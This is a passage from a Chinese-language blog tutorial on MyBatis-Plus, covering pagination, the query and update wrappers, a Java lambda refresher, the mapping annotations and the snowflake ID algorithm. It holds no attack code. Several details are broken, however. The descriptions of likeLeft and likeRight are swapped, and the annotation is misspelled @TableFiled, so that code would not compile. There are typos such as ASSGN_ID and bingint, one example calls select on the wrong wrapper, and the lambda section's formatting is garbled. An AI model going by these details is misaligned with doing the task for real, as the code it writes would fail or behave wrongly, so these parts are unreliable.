class="keyword">new</span> <span class="title class_">PaginationInnerInterceptor</span>(DbType.MYSQL));</span><br><span class="line">        <span class="keyword">return</span> mybatisPlusInterceptor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="Mybatis-Plus提供的CRUD方法"><a href="#Mybatis-Plus提供的CRUD方法" class="headerlink" title="Mybatis-Plus提供的CRUD方法"></a><code>Mybatis-Plus</code>提供的<code>CRUD</code>方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisPlus</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testPage</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// selectPage() 参数为Ipage接口对象</span></span><br><span class="line">        <span class="comment">// 放入Ipage接口实现类对象 -&gt; Page(页码,页容量)</span></span><br><span class="line">        Page&lt;User&gt; page = <span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line">        userMapper.selectPage(page,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//结果 page 最后也会被封装结果</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">current</span> <span class="operator">=</span> page.getCurrent();<span class="comment">// 页码</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">size</span>  <span class="operator">=</span> page.getSize();<span class="comment">// 页容量</span></span><br><span class="line">        List&lt;User&gt; records = page.getRecords(); <span class="comment">// 当前页数据</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">total</span> <span class="operator">=</span> page.getTotal();<span class="comment">// 总条数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="自定义CRUD方法"><a href="#自定义CRUD方法" class="headerlink" title="自定义CRUD方法"></a><strong>自定义CRUD方法</strong></h4><p>1、Mapper<strong>接口定义方法时需要返回</strong><code>Ipage接口对象</code>，同时需要额外传递<code>Ipage接口对象</code>作为参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;User&gt; &#123;</span><br><span class="line">    IPage&lt;User&gt; <span class="title function_">queryBySalary</span><span class="params">(IPage&lt;User&gt; page, <span class="meta">@Param(&quot;salary&quot;)</span> Double salary)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、mapper.xml正常编写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;select id=<span class="string">&quot;queryBySalary&quot;</span> resultType=<span class="string">&quot;user&quot;</span>&gt;</span><br><span class="line">    select * from user where salary &gt; #&#123;salary&#125;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure>

<p>3、使用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testMyPage</span><span class="params">()</span>&#123;</span><br><span class="line">    Page&lt;User&gt; page = <span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line">    userMapper.queryBySalary(page,<span class="number">100.01</span>);</span><br><span class="line">    <span class="comment">// 参数获取同上</span></span><br><span class="line">    List&lt;User&gt; records = page.getRecords(); <span class="comment">// 当前页数据</span></span><br><span class="line">    System.out.println(records.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="条件构造器使用"><a href="#条件构造器使用" class="headerlink" title="条件构造器使用"></a>条件构造器使用</h2><p>MyBatis-Plus 提供了强大的条件构造器 <code>Wrapper</code>，用于构建动态查询条件。最常用的 <code>Wrapper</code> 实现是 <code>QueryWrapper</code> 和 <code>UpdateWrapper</code>。这些构造器可以帮助避免手动编写复杂的 SQL 语句，并且使代码更加简洁和易读.</p>
<p>类结构：</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250203234626.png"></p>
<p><code>Wrapper</code> ： 条件构造抽象类，最顶端父类</p>
<ul>
<li><code>AbstractWrapper</code> ： 用于查询条件封装，生成 sql 的 where 条件<ul>
<li><code>QueryWrapper</code> ： 查询&#x2F;删除条件封装。<strong>常用</strong></li>
<li><code>UpdateWrapper</code> ： 修改条件封装。<strong>常用</strong></li>
<li><code>AbstractLambdaWrapper</code> ： 使用Lambda 语法<ul>
<li><code>LambdaQueryWrapper</code> ：用于Lambda语法使用的查询Wrapper。<strong>常用</strong></li>
<li><code>LambdaUpdateWrapper</code> ： Lambda 更新封装Wrappe。<strong>常用</strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="QueryWrapper-常用方法"><a href="#QueryWrapper-常用方法" class="headerlink" title="QueryWrapper 常用方法"></a>QueryWrapper 常用方法</h3><p>可以链式调用.</p>
<table>
<thead>
<tr>
<th>操作类型</th>
<th>方法签名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>等于</strong></td>
<td><code>eq(String column, Object val)</code></td>
<td>判断字段是否等于指定值。</td>
</tr>
<tr>
<td><strong>不等于</strong></td>
<td><code>ne(String column, Object val)</code></td>
<td>判断字段是否不等于指定值。</td>
</tr>
<tr>
<td><strong>大于</strong></td>
<td><code>gt(String column, Object val)</code></td>
<td>判断字段是否大于指定值。</td>
</tr>
<tr>
<td><strong>小于</strong></td>
<td><code>lt(String column, Object val)</code></td>
<td>判断字段是否小于指定值。</td>
</tr>
<tr>
<td><strong>大于等于</strong></td>
<td><code>ge(String column, Object val)</code></td>
<td>判断字段是否大于等于指定值。</td>
</tr>
<tr>
<td><strong>小于等于</strong></td>
<td><code>le(String column, Object val)</code></td>
<td>判断字段是否小于等于指定值。</td>
</tr>
<tr>
<td><strong>模糊匹配</strong></td>
<td><code>like(String column, Object val)</code></td>
<td>判断字段是否包含指定值（模糊匹配）。</td>
</tr>
<tr>
<td><strong>左模糊匹配</strong></td>
<td><code>likeLeft(String column, Object val)</code></td>
<td>判断字段是否以指定值开头（左模糊匹配）。</td>
</tr>
<tr>
<td><strong>右模糊匹配</strong></td>
<td><code>likeRight(String column, Object val)</code></td>
<td>判断字段是否以指定值结尾（右模糊匹配）。</td>
</tr>
<tr>
<td><strong>在集合中</strong></td>
<td><code>in(String column, Collection&lt;?&gt; coll)</code></td>
<td>判断字段是否在指定集合中。</td>
</tr>
<tr>
<td><strong>不在集合中</strong></td>
<td><code>notIn(String column, Collection&lt;?&gt; coll)</code></td>
<td>判断字段是否不在指定集合中。</td>
</tr>
<tr>
<td><strong>排序</strong></td>
<td><code>orderByAsc(String... columns)</code> <br> <code>orderByDesc(String... columns)</code></td>
<td>按照指定字段升序或降序排列。</td>
</tr>
<tr>
<td><strong>空值判断</strong></td>
<td><code>isNull(String column)</code></td>
<td>判断字段是否为 <code>null</code>。</td>
</tr>
<tr>
<td><strong>非空值判断</strong></td>
<td><code>isNotNull(String column)</code></td>
<td>判断字段是否不为 <code>null</code>。</td>
</tr>
<tr>
<td><strong>自定义 SQL 片段</strong></td>
<td><code>apply(String sql, Object... params)</code></td>
<td>添加自定义的 SQL 片段。</td>
</tr>
<tr>
<td><strong>子查询</strong></td>
<td><code>inSql(String column, String inSql)</code></td>
<td>在查询条件中使用子查询。</td>
</tr>
<tr>
<td><strong>分组</strong></td>
<td><code>groupBy(String... columns)</code></td>
<td>对查询结果进行分组。</td>
</tr>
<tr>
<td><strong>HAVING 条件</strong></td>
<td><code>having(String sqlHaving, Object... params)</code></td>
<td>添加 HAVING 条件。</td>
</tr>
</tbody></table>
<h3 id="UpdateWrapper-常用方法"><a href="#UpdateWrapper-常用方法" class="headerlink" title="UpdateWrapper 常用方法"></a>UpdateWrapper 常用方法</h3><p><strong>上述方法除分组、HAVING条件、排序外均可用于设置更新条件</strong></p>
<table>
<thead>
<tr>
<th>操作类型</th>
<th>方法签名</th>
<th>示例代码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>设置更新条件</strong></td>
<td><code>set(String column, Object val)</code></td>
<td><code>updateWrapper.set(&quot;status&quot;, 1);</code></td>
<td>设置更新字段和值。</td>
</tr>
<tr>
<td><strong>执行更新操作</strong></td>
<td><code>update(T entity, Wrapper&lt;T&gt; updateWrapper)</code></td>
<td><code>userMapper.update(new User(), updateWrapper);</code></td>
<td>执行更新操作。</td>
</tr>
</tbody></table>
<h3 id="lambda表达式回顾"><a href="#lambda表达式回顾" class="headerlink" title="lambda表达式回顾"></a>lambda表达式回顾</h3><ol>
<li><p><strong>基本语法</strong></p>
<ul>
<li><code>(参数类型 参数名) -&gt; &#123; 方法体 &#125;</code></li>
<li>示例：<code>(int a, int b) -&gt; &#123; return a + b; &#125;</code></li>
</ul>
</li>
<li><p><strong>简化语法</strong></p>
<ul>
<li>如果只有一个参数，可以省略括号：<ul>
<li><code>a -&gt; &#123; return a * 2; &#125;</code></li>
</ul>
</li>
<li>如果没有参数，使用空括号：<ul>
<li><code>() -&gt; &#123; return &quot;Hello&quot;; &#125;</code></li>
</ul>
</li>
<li>如果方法体只有一行代码，可以省略大括号和 <code>return</code> 关键字：<ul>
<li><code>(a, b) -&gt; a + b</code></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>函数式接口</strong></p>
<ul>
<li>Lambda 表达式只能用于实现<strong>函数式接口</strong>（即仅包含一个抽象方法的接口）。</li>
<li>常见的函数式接口包括：<ul>
<li><code>Runnable</code>: <code>() -&gt; System.out.println(&quot;Running&quot;)</code></li>
<li><code>Comparator&lt;T&gt;</code>: <code>(a, b) -&gt; a.compareTo(b)</code></li>
<li><code>Function&lt;T, R&gt;</code>: <code>x -&gt; x * 2</code></li>
<li><code>Predicate&lt;T&gt;</code>: <code>s -&gt; s.isEmpty()</code></li>
<li><code>Consumer&lt;T&gt;</code>: <code>t -&gt; System.out.println(t)</code></li>
<li><code>Supplier&lt;T&gt;</code>: <code>() -&gt; new User()</code></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>参数类型推断</strong></p>
<ul>
<li>编译器可以根据上下文自动推断参数类型，因此通常可以省略参数类型：<ul>
<li><code>(a, b) -&gt; a + b</code> 可以简写为 <code>(a, b) -&gt; a + b</code> （假设 <code>a</code> 和 <code>b</code> 的类型已知）</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>变量捕获</strong></p>
<ul>
<li>Lambda 表达式可以访问外部的局部变量，但这些变量必须是<strong>final</strong>或<strong>effectively final</strong>（实际上不可变）：<ul>
<li><pre><code class="java">String prefix = &quot;Hello, &quot;;
Consumer&lt;String&gt; greet = name -&gt; System.out.println(prefix + name);
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">6. **方法引用**</span><br><span class="line">   - 使用 `::` 来引用现有方法：</span><br><span class="line">     - 静态方法引用：`ClassName::staticMethodName`</span><br><span class="line">     - 实例方法引用：`instance::methodName`</span><br><span class="line">     - 特定类型的任意对象的方法引用：`ClassName::methodName`</span><br><span class="line">     - 构造方法引用：`ClassName::new`</span><br><span class="line">     - 示例：</span><br><span class="line">       - `String::toUpperCase`</span><br><span class="line">       - `System.out::println`</span><br><span class="line">       - `User::new`</span><br><span class="line"></span><br><span class="line">7. **Lambda 表达式的类型**</span><br><span class="line">   - Lambda 表达式的类型由其目标类型决定，即它可以赋值给的函数式接口类型：</span><br><span class="line">     - ```java</span><br><span class="line">       Runnable r = () -&gt; System.out.println(&quot;Running&quot;);</span><br><span class="line">       Comparator&lt;String&gt; c = (a, b) -&gt; a.compareTo(b);</span><br><span class="line">       Function&lt;Integer, Integer&gt; f = x -&gt; x * 2;</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>流操作中的应用</strong></p>
<ul>
<li>在 Java Stream API 中，Lambda 表达式常用于定义中间操作和终端操作：<ul>
<li>过滤元素：<code>list.stream().filter(x -&gt; x &gt; 10).forEach(System.out::println);</code></li>
<li>映射元素：<code>list.stream().map(String::toUpperCase).collect(Collectors.toList());</code></li>
<li>聚合操作：<code>int sum = list.stream().mapToInt(Integer::intValue).sum();</code></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>示例</strong></p>
<ul>
<li><p><strong>无参数 Lambda 表达式</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Runnable</span> <span class="variable">runnable</span> <span class="operator">=</span> () -&gt; System.out.println(<span class="string">&quot;Running&quot;</span>);</span><br><span class="line">runnable.run();</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>单个参数 Lambda 表达式</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Consumer&lt;String&gt; consumer = message -&gt; System.out.println(message);</span><br><span class="line">consumer.accept(<span class="string">&quot;Hello, World!&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>多个参数 Lambda 表达式</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BiFunction&lt;Integer, Integer, Integer&gt; adder = (a, b) -&gt; a + b;</span><br><span class="line"><span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> adder.apply(<span class="number">5</span>, <span class="number">3</span>);</span><br><span class="line">System.out.println(result); <span class="comment">// 输出 8</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>方法引用</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; names = Arrays.asList(<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Charlie&quot;</span>);</span><br><span class="line">names.forEach(System.out::println);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="LambdaQueryWrapper-常用方法"><a href="#LambdaQueryWrapper-常用方法" class="headerlink" title="LambdaQueryWrapper 常用方法"></a>LambdaQueryWrapper 常用方法</h3><p><strong>使用LambdaQueryWrapper通过Lambda调用get方法可以不用记忆列名，避免错误。</strong></p>
<table>
<thead>
<tr>
<th>操作类型</th>
<th>方法签名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>等于</strong></td>
<td><code>eq(SFunction&lt;T, ?&gt; column, Object val)</code></td>
<td>使用 Lambda 表达式判断字段是否等于指定值。</td>
</tr>
<tr>
<td><strong>不等于</strong></td>
<td><code>ne(SFunction&lt;T, ?&gt; column, Object val)</code></td>
<td>使用 Lambda 表达式判断字段是否不等于指定值。</td>
</tr>
<tr>
<td><strong>大于</strong></td>
<td><code>gt(SFunction&lt;T, ?&gt; column, Object val)</code></td>
<td>使用 Lambda 表达式判断字段是否大于指定值。</td>
</tr>
<tr>
<td><strong>小于</strong></td>
<td><code>lt(SFunction&lt;T, ?&gt; column, Object val)</code></td>
<td>使用 Lambda 表达式判断字段是否小于指定值。</td>
</tr>
<tr>
<td><strong>大于等于</strong></td>
<td><code>ge(SFunction&lt;T, ?&gt; column, Object val)</code></td>
<td>使用 Lambda 表达式判断字段是否大于等于指定值。</td>
</tr>
<tr>
<td><strong>小于等于</strong></td>
<td><code>le(SFunction&lt;T, ?&gt; column, Object val)</code></td>
<td>使用 Lambda 表达式判断字段是否小于等于指定值。</td>
</tr>
<tr>
<td><strong>模糊匹配</strong></td>
<td><code>like(SFunction&lt;T, ?&gt; column, Object val)</code></td>
<td>使用 Lambda 表达式判断字段是否包含指定值（模糊匹配）。</td>
</tr>
<tr>
<td><strong>左模糊匹配</strong></td>
<td><code>likeLeft(SFunction&lt;T, ?&gt; column, Object val)</code></td>
<td>使用 Lambda 表达式判断字段是否以指定值开头（左模糊匹配）。</td>
</tr>
<tr>
<td><strong>右模糊匹配</strong></td>
<td><code>likeRight(SFunction&lt;T, ?&gt; column, Object val)</code></td>
<td>使用 Lambda 表达式判断字段是否以指定值结尾（右模糊匹配）。</td>
</tr>
<tr>
<td><strong>在集合中</strong></td>
<td><code>in(SFunction&lt;T, ?&gt; column, Collection&lt;?&gt; coll)</code></td>
<td>使用 Lambda 表达式判断字段是否在指定集合中。</td>
</tr>
<tr>
<td><strong>不在集合中</strong></td>
<td><code>notIn(SFunction&lt;T, ?&gt; column, Collection&lt;?&gt; coll)</code></td>
<td>使用 Lambda 表达式判断字段是否不在指定集合中。</td>
</tr>
<tr>
<td><strong>排序</strong></td>
<td><code>orderByAsc(SFunction&lt;T, ?&gt;... columns)</code> <br> <code>orderByDesc(SFunction&lt;T, ?&gt;... columns)</code></td>
<td>使用 Lambda 表达式按照指定字段升序或降序排列。</td>
</tr>
<tr>
<td><strong>空值判断</strong></td>
<td><code>isNull(SFunction&lt;T, ?&gt; column)</code></td>
<td>使用 Lambda 表达式判断字段是否为 <code>null</code>。</td>
</tr>
<tr>
<td><strong>非空值判断</strong></td>
<td><code>isNotNull(SFunction&lt;T, ?&gt; column)</code></td>
<td>使用 Lambda 表达式判断字段是否不为 <code>null</code>。</td>
</tr>
<tr>
<td><strong>自定义 SQL 片段</strong></td>
<td><code>apply(String sql, Object... params)</code></td>
<td>添加自定义的 SQL 片段。</td>
</tr>
<tr>
<td><strong>子查询</strong></td>
<td><code>inSql(SFunction&lt;T, ?&gt; column, String inSql)</code></td>
<td>在查询条件中使用子查询。</td>
</tr>
</tbody></table>
<h3 id="LambdaUpdateWrapper-常用方法"><a href="#LambdaUpdateWrapper-常用方法" class="headerlink" title="LambdaUpdateWrapper 常用方法"></a>LambdaUpdateWrapper 常用方法</h3><p><strong>上述LambdaQueryWrapper 的方法除分组、HAVING条件、排序外均可用于设置更新条件</strong></p>
<table>
<thead>
<tr>
<th>操作类型</th>
<th>方法签名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>设置更新条件</strong></td>
<td><code>set(SFunction&lt;T, ?&gt; column, Object val)</code></td>
<td>使用 Lambda 表达式设置更新字段和值。</td>
</tr>
</tbody></table>
<h3 id="组合条件-and-or-与高级用法"><a href="#组合条件-and-or-与高级用法" class="headerlink" title="组合条件(and&#x2F;or)与高级用法"></a>组合条件(and&#x2F;or)与高级用法</h3><h4 id="组合条件"><a href="#组合条件" class="headerlink" title="组合条件"></a>组合条件</h4><p>主动调用<code>or()</code>表示前后两个条件使用<code>or</code>连接，不主动调用<strong>默认使用</strong><code>and</code>连接</p>
<table>
<thead>
<tr>
<th>操作类型</th>
<th>方法签名</th>
<th>示例代码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>组合 AND 条件</strong></td>
<td><code>and(Consumer&lt;Param&gt; consumer)</code></td>
<td><code>queryWrapper.and(wrapper -&gt; wrapper.eq(&quot;status&quot;, 1).or().eq(&quot;status&quot;, 2));</code></td>
<td>组合多个 AND 条件。</td>
</tr>
<tr>
<td><strong>组合 OR 条件</strong></td>
<td><code>or(Consumer&lt;Param&gt; consumer)</code></td>
<td><code>queryWrapper.or(wrapper -&gt; wrapper.eq(&quot;status&quot;, 1).or().eq(&quot;status&quot;, 2));</code></td>
<td>组合多个 OR 条件。</td>
</tr>
</tbody></table>
<h4 id="子查询与自定义-SQL-片段"><a href="#子查询与自定义-SQL-片段" class="headerlink" title="子查询与自定义 SQL 片段"></a>子查询与自定义 SQL 片段</h4><table>
<thead>
<tr>
<th>操作类型</th>
<th>方法签名</th>
<th>示例代码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>子查询</strong></td>
<td><code>inSql(String column, String inSql)</code></td>
<td><code>queryWrapper.inSql(&quot;id&quot;, &quot;select id from temp_user where status = 1&quot;);</code></td>
<td>在查询条件中使用子查询。</td>
</tr>
<tr>
<td><strong>自定义 SQL 片段</strong></td>
<td><code>apply(String sql, Object... params)</code></td>
<td><code>queryWrapper.apply(&quot;date_format(create_time,&#39;%Y-%m-%d&#39;) = &#123;0&#125;&quot;, &quot;2025-02-03&quot;);</code></td>
<td>添加自定义的 SQL 片段。</td>
</tr>
</tbody></table>
<h3 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a><strong>使用示例</strong></h3><p>补充说明：</p>
<ul>
<li>每个条件拼接方法都condition参数,这是一个比较运算,为true追加当前条件!</li>
<li>两种QueryWrapper都可以使用 <code>select</code> 方法来选择特定的列，而不是默认选择所有列，其他字段将不会被填充。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testWrapper</span><span class="params">()</span>&#123;</span><br><span class="line">    QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">    queryWrapper.between(<span class="string">&quot;salary&quot;</span>,<span class="number">500</span>,<span class="number">1000</span>);</span><br><span class="line">    List&lt;User&gt; users = userMapper.selectList(queryWrapper);</span><br><span class="line">    System.out.println(users);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//每个条件拼接方法都condition参数,这是一个比较运算,为true追加当前条件!</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    QueryWrapper&lt;User&gt; queryWrapper1 = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">    queryWrapper1.between(n&gt;<span class="number">10</span>,<span class="string">&quot;salary&quot;</span>,<span class="number">500</span>,<span class="number">800</span>);</span><br><span class="line">    List&lt;User&gt; users1 = userMapper.selectList(queryWrapper1);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用 select 方法来选择只查询特定的列</span></span><br><span class="line">    QueryWrapper&lt;User&gt; queryWrapper2 = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">    queryWrapper.select(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;age&quot;</span>);</span><br><span class="line">    List&lt;User&gt; userList = userMapper.selectList(queryWrapper);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











<h2 id="核心注解使用"><a href="#核心注解使用" class="headerlink" title="核心注解使用"></a>核心注解使用</h2><ul>
<li>**<code>@TableName</code>**：用于指定实体类对应的数据库表名。</li>
<li>**<code>@TableId</code>**：用于标识实体类中的主键字段，并可以指定主键生成策略。</li>
<li>**<code>@TableField</code>**：用于指定实体类中的普通字段与数据库表中的列的映射关系，并可以设置一些特殊的行为。</li>
</ul>
<h3 id="TableName注解"><a href="#TableName注解" class="headerlink" title="@TableName注解"></a>@TableName注解</h3><p><code>@TableName</code>注解<strong>添加在实体类上，</strong>用于明确<strong>指定实体类与数据库表的对应关系</strong>。如果实体类名与数据库表名不一致时使用该注解进行映射。一般情况下，Mybatis-Plus会<strong>默认寻找与实体类同名的表</strong>（大小写不影响）进行数据库操作，但通常情况下我们Java使用驼峰命名法，数据库采用下划线命名法，会导致映射错误，此时就需要此注解进行指定：</p>
<p><strong>示例</strong>：数据库表名<code>t_emp</code>；实体类名<code>Employee</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(&quot;t_emp&quot;)</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> salary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="TableName注解功能的简化实现-配置项"><a href="#TableName注解功能的简化实现-配置项" class="headerlink" title="@TableName注解功能的简化实现 - 配置项"></a>@TableName注解功能的简化实现 - 配置项</h4><p>当数据库中所有表采用<code>前缀+实体类名</code>方式命名时，可以在配置文件中添加：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">    <span class="attr">global-config:</span></span><br><span class="line">      <span class="attr">db-config:</span></span><br><span class="line">        <span class="attr">table-prefix:</span> <span class="string">t_</span>  <span class="comment"># 表名前缀，不用在每个实体类上再添加@TableName注解了</span></span><br></pre></td></tr></table></figure>



<h3 id="TableId-注解"><a href="#TableId-注解" class="headerlink" title="@TableId 注解"></a>@TableId 注解</h3><p><code>@TableId</code>注解<strong>添加在实体类主键对应的属性上，</strong>用于明确<strong>标识实体类中的主键字段</strong>。如果实体类主键对应属性名与数据库表中主键字段名不一致时使用该注解进行映射。</p>
<p><strong>常用属性</strong>：</p>
<ul>
<li><code>value</code>: 主键字段在数据库中的名称（可选，默认为字段名）。</li>
<li><code>type</code>: 主键生成策略，默认是<code>IdType.NONE</code><ul>
<li><code>IdType.AUTO</code> 自增 <strong>数据库表主键必须是auto_increment的</strong></li>
<li><code>IdType.ASSGN_ID</code> 采用雪花算法，随机生成唯一不重复的long类型数据。（3.3.0版本后才可使用）采用此类，<strong>数据库表主键必须是bingint类型或varchar类型，实体类属性必须时long类型</strong></li>
<li><code>IdType.INPUT</code> 手动输入</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(&quot;t_emp&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line">    <span class="meta">@TableId(value = &quot;emp_id&quot;,type = IdType.AUTO)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> salary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="TableId注解功能的简化实现-配置项"><a href="#TableId注解功能的简化实现-配置项" class="headerlink" title="@TableId注解功能的简化实现 - 配置项"></a>@TableId注解功能的简化实现 - 配置项</h4><p>同样可以通过配置文件配置：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">global-config:</span></span><br><span class="line">    <span class="attr">db-config:</span></span><br><span class="line">      <span class="attr">id-type:</span> <span class="string">assign_id</span></span><br></pre></td></tr></table></figure>



<h3 id="雪花算法"><a href="#雪花算法" class="headerlink" title="雪花算法"></a>雪花算法</h3><p><strong>雪花算法</strong> 是由 Twitter 开发的一种分布式唯一ID生成算法，能够在分布式系统中高效地生成64位的唯一ID。这个算法生成的ID是一个64位的整数，通常以字符串形式表示。</p>
<p>雪花算法生成的ID由以下几个部分组成：</p>
<ul>
<li><strong>符号位（1位）</strong>：始终为0，表示正数。</li>
<li><strong>时间戳（41位）</strong>：记录自定义纪元（epoch）以来的时间戳，单位通常是毫秒。可以支持大约69年的时间。</li>
<li><strong>工作机器ID（10位）</strong>：包括数据中心ID和工作节点ID，用于区分不同的机器。通常分为5位数据中心ID和5位工作节点ID。</li>
<li><strong>序列号（12位）</strong>：在同一毫秒内生成的多个ID通过序列号进行区分。12位可以支持每毫秒生成4096个不同的ID。</li>
</ul>
<p>在 MyBatis-Plus 中，<code>IdType.ASSIGN_ID</code> 的具体实现位于 </p>
<p><code>com.baomidou.mybatisplus.core.incrementer.DefaultIdentifierGenerator</code> 类中</p>
<h3 id="TableField注解"><a href="#TableField注解" class="headerlink" title="@TableField注解"></a>@TableField注解</h3><p><code>@TableField</code>注解<strong>添加在实体类非主键属性上，</strong>用于<strong>映射实体类中的字段到数据库表中的列</strong>，还可以指定字段的一些特殊行为（如是否插入、是否更新等）。如果实体类属性名与数据库表中字段名不一致时使用该注解进行映射。</p>
<p><strong>常用属性</strong>：</p>
<ul>
<li><code>value</code>: 数据库表中的列名（可选，默认为字段名）。</li>
<li><code>exist</code>: 是否存在该字段（默认为 <code>true</code>）。当此属性仅为实体类属性而不是数据库字段时，使用。</li>
<li><code>insertStrategy</code>: 插入策略（如 <code>FieldStrategy.IGNORED</code> 忽略等）。</li>
<li><code>updateStrategy</code>: 更新策略（如 <code>FieldStrategy.IGNORED</code> 忽略等）。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(&quot;t_emp&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line">    <span class="meta">@TableId(value = &quot;emp_id&quot;,type = IdType.AUTO)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="meta">@TableFiled(&quot;emp_name&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@TableFiled(&quot;emp_salary&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> salary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="高级扩展"><a href="#高级扩展" class="headerlink" title="高级扩展"></a>高级扩展</h1><h2 id="逻辑删除"><a href="#逻辑删除" class="headerlink" title="逻辑删除"></a>逻辑删除</h2><p>逻辑删除，可以方便地实现对数据库记录的逻辑删除而不是物理删除。逻辑删除是指通过更改记录的状态或添加标记字段来模拟删除操作，从而保留了删除前的数据，便于后续的数据分析和恢复。</p>
